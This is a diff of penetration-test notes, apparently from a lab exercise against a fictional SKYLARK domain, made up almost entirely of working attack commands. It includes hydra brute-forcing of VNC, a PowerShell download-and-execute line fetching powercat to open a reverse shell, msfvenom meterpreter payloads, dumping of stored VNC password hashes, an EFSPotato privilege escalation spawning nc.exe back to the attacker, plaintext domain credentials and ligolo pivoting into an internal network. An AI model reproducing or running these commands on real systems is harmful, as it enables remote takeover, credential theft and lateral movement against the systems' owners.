@@ -22,7 +22,7 @@ nmap -sT -A -p 80 192.168.186.220
 # enumerate vnc, cannot connect
 nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900 192.168.240.220
 hydra -s 5900 -P /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt -t 16 192.168.240.220 vnc
-vncviewer 192.168.240.220::5901
+vncviewer 192.168.229.220::5901
 
 # enumerate smb - we need a password to do anything
 enum4linux 192.168.240.220
@@ -63,16 +63,36 @@ partner:Skylark__ChangingTheWorld!
 http://192.168.229.220/upload
 http://192.168.229.220/configuration
 
-C:\\Uploads
-C:\\Uploads\\f63a20c6test2.ps1
+C:\Uploads\ddda527bshell3.ps1
 
 http://192.168.229.220/download?filename=f63a20c6test2.ps1
 
 echo "Hello" | pandoc -o out2.docx
 
+# used this one for the ps1 shell
 IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.229/powercat.ps1');powercat -c 192.168.45.229 -p 443 -e cmd
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.229 LPORT=443 -f exe > rev443.exe
+
+Get-ChildItem -Path C:\ -Include *.ini -File -Recurse -ErrorAction SilentlyContinue
+
+# find vnc file
+cat C:\"Program Files"\"uvnc bvba"\UltraVNC\ultravnc.ini
+
+# obtain vnc passwords
+passwd=BFE825DE515A335BE3
+passwd2=59A04800B111ADB060
+
+```
+.220 privesc
+```
+# we have SeImpersonate
+# using EFS potato we can get a root shell on 9999
+iwr -uri http://192.168.45.229/efspotato.cs -Outfile efspotato.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
+iwr -uri http://192.168.45.229/nc.exe -Outfile nc.exe
+
+.\efspotato.exe "nc.exe 192.168.45.229 9999 -e cmd"
 ```
 
 .221 (austin02.SKYLARK.com)
@@ -104,7 +124,7 @@ feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/Common-PHP-File
 SKYLARK\kiosk - XEwUS^9R2Gwt8O914
 
 # use this command for initial access. Click on 'austin02' link, then open cmd.exe from the filesystem
-xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.186.221
+xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.229.221
 
 xfreerdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.186.221
 
@@ -113,6 +133,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=9999 -f exe
 nc -nvlp 8888
 iwr -uri http://192.168.45.217:8000/shell8888.exe -Outfile shell.exe
 .\shell.exe
+
 
 ```
 
@@ -199,16 +220,18 @@ sudo ip link set ligolo up
 >> start
 
 # add route to internal network
-sudo ip route add 10.10.76.0/24 dev ligolo
+sudo ip route add 10.10.119.0/24 dev ligolo
 
-# from windows target
-iwr -uri http://192.168.45.217:8000/agent.exe -Outfile agent.exe
-./agent.exe -ignore-cert -connect 192.168.45.217:11601
+# from windows target C:/Users/kiosk
+iwr -uri http://192.168.45.229/agent.exe -Outfile agent.exe
+./agent.exe -ignore-cert -connect 192.168.45.229:11601
 
 # 22,5901
-sudo nmap -p- -Pn 10.10.76.10 -sS -T 5 --verbose
-vncviewer 10.10.76.10::5901
+sudo nmap -p- -Pn 10.10.119.10 -sS -T 5 --verbose
+vncviewer 10.10.119.10::5901
 # need password from 220
+passwd=BFE825DE515A335BE3
+passwd2=59A04800B111ADB060
 
 # 445, 5985
 sudo nmap -p- -Pn 10.10.76.11 -sS -T 5 --verbose
